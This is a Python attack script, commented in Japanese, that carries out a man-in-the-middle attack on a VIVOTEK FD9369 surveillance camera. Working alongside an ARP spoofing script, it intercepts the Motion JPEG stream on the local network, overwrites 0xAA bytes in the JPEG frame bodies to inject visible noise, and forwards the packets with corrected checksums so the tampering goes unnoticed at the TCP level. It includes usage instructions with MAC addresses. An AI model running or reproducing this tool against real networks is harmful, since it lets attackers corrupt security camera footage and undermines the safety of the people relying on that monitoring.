#!/usr/bin/env python3
"""
vivotek_attack1_noise.py - 攻撃① ペイロード改ざんによる映像ノイズ発生
対象: VIVOTEK FD9369 (Motion JPEG over HTTP)

parapara.py のアーキテクチャを採用:
- パケット長は元と完全一致（TCP整合性を維持）
- Content-Length ベースで JPEG 本文を正確に判別
- seq 順序制御: 順序通りのパケットのみ改ざん、再送は透過
- JPEG 本文内の 0xAA を 0x00 に置換してノイズを発生

使い方:
  1. arp_spoofing.py を先に起動
  2. 本スクリプトを別ターミナルで実行

  python vivotek_attack1_noise.py --camera-mac 08:00:23:9C:31:FF \\
      --monitor-mac D0:BF:9C:E2:25:2D --attacker-mac A0:CE:C8:A4:EB:D5
"""

import argparse
import re
import threading
from scapy.all import *

# ==== MJPEG 解析用 ====
BOUNDARY = b"--myboundary"
RE_CT = re.compile(br"Content[- ]type:\s*image/jpeg", re.IGNORECASE)
RE_CL = re.compile(br"Content[- ]length:\s*(\d+)", re.IGNORECASE)
MIN_JPEG_LEN = 64
HDRBUF_CAP = 16384


class Flow:
    """TCPフローごとの MJPEG パーサ状態"""
    __slots__ = ("phase", "hdr_buf", "body_left", "next_seq_cam")

    def __init__(self):
        self.phase = "HEADER_WAIT"  # HEADER_WAIT or BODY_LEN
        self.hdr_buf = b""
        self.body_left = 0
        self.next_seq_cam = None


def _transform_noise(raw, st):
    """
    MJPEG ストリームを Content-Length ベースでパースし、
    JPEG 本文部分の 0xAA を 0x00 に置換する。
    パケット長は元と完全一致。
    """
    L = len(raw)
    out = bytearray(L)
    out_pos = 0
    i = 0

    while i < L:
        if st.phase == "HEADER_WAIT":
            # ヘッダ部分: Content-Type / Content-Length を探す
            remain = raw[i:]
            hb = st.hdr_buf
            buf = (hb[-HDRBUF_CAP:] + remain) if hb else remain
            pos = buf.find(b"\r\n\r\n")

            if pos == -1:
                # ヘッダ未完結 → そのまま透過
                out[out_pos:out_pos + len(remain)] = remain
                out_pos += len(remain)
                nb = (hb + remain) if hb else remain
                if len(nb) > HDRBUF_CAP:
                    nb = nb[-HDRBUF_CAP:]
                st.hdr_buf = nb
                break
            else:
                hdr_total = pos + 4
                cur_have = len(hb)
                need = hdr_total - cur_have
                if need > 0:
                    part = remain[:need]
                    out[out_pos:out_pos + need] = part
                    out_pos += need
                    i += need

                full_hdr = (hb + remain[:max(0, need)])[:hdr_total] if cur_have else remain[:hdr_total]
                is_jpeg = RE_CT.search(full_hdr) is not None
                mcl = RE_CL.search(full_hdr)
                declared = int(mcl.group(1)) if mcl else None

                if is_jpeg and declared is not None and declared >= MIN_JPEG_LEN:
                    st.phase = "BODY_LEN"
                    st.hdr_buf = b""
                    st.body_left = declared
                    continue
                else:
                    st.hdr_buf = b""
                    rem = raw[i:L]
                    if rem:
                        out[out_pos:out_pos + len(rem)] = rem
                        out_pos += len(rem)
                    break

        elif st.phase == "BODY_LEN":
            # JPEG 本文部分: 0xAA → 0x00 に置換
            rem_pkt = L - i
            need = min(rem_pkt, st.body_left)

            # JPEG データを 0xAA→0x00 で書き換え
            chunk = raw[i:i + need]
            replaced = chunk.replace(b'\xaa', b'\x00')
            out[out_pos:out_pos + need] = replaced
            out_pos += need

            i += need
            st.body_left -= need

            if st.body_left <= 0:
                st.phase = "HEADER_WAIT"
                st.hdr_buf = b""
                if i < L:
                    rem = raw[i:L]
                    out[out_pos:out_pos + len(rem)] = rem
                    out_pos += len(rem)
                    nb = st.hdr_buf + rem
                    if len(nb) > HDRBUF_CAP:
                        nb = nb[-HDRBUF_CAP:]
                    st.hdr_buf = nb
                break
        else:
            st.phase = "HEADER_WAIT"
            st.hdr_buf = b""

    return bytes(out)


def main():
    parser = argparse.ArgumentParser(
        description="攻撃① 0xAA→0x00 書き換えによる映像ノイズ (VIVOTEK FD9369)")
    parser.add_argument("--camera-mac", required=True,
                        help="監視カメラの MAC アドレス")
    parser.add_argument("--monitor-mac", required=True,
                        help="監視端末の MAC アドレス")
    parser.add_argument("--attacker-mac", required=True,
                        help="攻撃用 PC の MAC アドレス")
    parser.add_argument("--iface", default="イーサネット",
                        help="ネットワークインターフェース名 (デフォルト: イーサネット)")
    args = parser.parse_args()

    mac0 = args.attacker_mac.lower()
    mac1 = args.camera_mac.lower()
    mac2 = args.monitor_mac.lower()
    IF = args.iface

    FILT = "tcp port 80 and ether dst " + mac0

    # Silence scapy
    conf.verb = False
    conf.use_pcap = True

    # L2 ソケットを事前に開く (高速化)
    tx = conf.L2socket(iface=IF)

    # フロー状態管理
    flows = {}
    flow_lock = threading.Lock()

    def _recalc_and_send(pkt):
        if pkt.haslayer(IP):
            pkt[IP].len = None
            pkt[IP].chksum = None
        if pkt.haslayer(TCP):
            pkt[TCP].chksum = None
        tx.send(bytes(pkt))

    def maeta(pkt):
        if not pkt.haslayer(Ether):
            return
        src = pkt[Ether].src.lower()

        # 監視PC → カメラ: そのまま転送
        if src == mac2:
            q = pkt.copy()
            q[Ether].src = mac0
            q[Ether].dst = mac1
            _recalc_and_send(q)
            return

        # カメラ → 監視PC
        if src == mac1:
            if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
                q = pkt.copy()
                q[Ether].src = mac0
                q[Ether].dst = mac2
                _recalc_and_send(q)
                return

            tcp = pkt[TCP]
            raw_layer = pkt.getlayer(Raw)
            key = (pkt[IP].src, tcp.sport, pkt[IP].dst, tcp.dport)

            # データ無し (ACK等) はそのまま転送
            if raw_layer is None:
                q = pkt.copy()
                q[Ether].src = mac0
                q[Ether].dst = mac2
                _recalc_and_send(q)
                return

            seg_seq = int(tcp.seq)
            seg_len = len(raw_layer.load)

            with flow_lock:
                st = flows.get(key)
                if st is None:
                    st = Flow()
                    flows[key] = st
                expected = st.next_seq_cam

            # 初回: 基準確定
            if expected is None:
                out = _transform_noise(raw_layer.load, st)
                p = pkt.copy()
                if p.haslayer(Raw):
                    p[Raw].load = out
                else:
                    p = p / Raw(load=out)
                p[Ether].src = mac0
                p[Ether].dst = mac2
                _recalc_and_send(p)
                with flow_lock:
                    st.next_seq_cam = seg_seq + seg_len
                return

            # 順序外・再送はそのまま透過
            if seg_seq != expected:
                q = pkt.copy()
                q[Ether].src = mac0
                q[Ether].dst = mac2
                _recalc_and_send(q)
                return

            # 順序通り: 置換して転送
            out = _transform_noise(raw_layer.load, st)
            p = pkt.copy()
            if p.haslayer(Raw):
                p[Raw].load = out
            else:
                p = p / Raw(load=out)
            p[Ether].src = mac0
            p[Ether].dst = mac2
            _recalc_and_send(p)
            with flow_lock:
                st.next_seq_cam = expected + seg_len

    print("=" * 55)
    print("  攻撃① 0xAA→0x00 書き換え (映像ノイズ)")
    print("  対象: VIVOTEK FD9369 (Motion JPEG)")
    print("=" * 55)
    print(f"  カメラ   MAC : {mac1}")
    print(f"  監視PC   MAC : {mac2}")
    print(f"  攻撃PC   MAC : {mac0}")
    print(f"  フィルタ      : {FILT}")
    print("=" * 55)
    print("[*] パケット中継開始... (Ctrl+C で終了)")
    print()

    sniff(iface=IF, filter=FILT, store=0, prn=maeta)


if __name__ == "__main__":
    main()
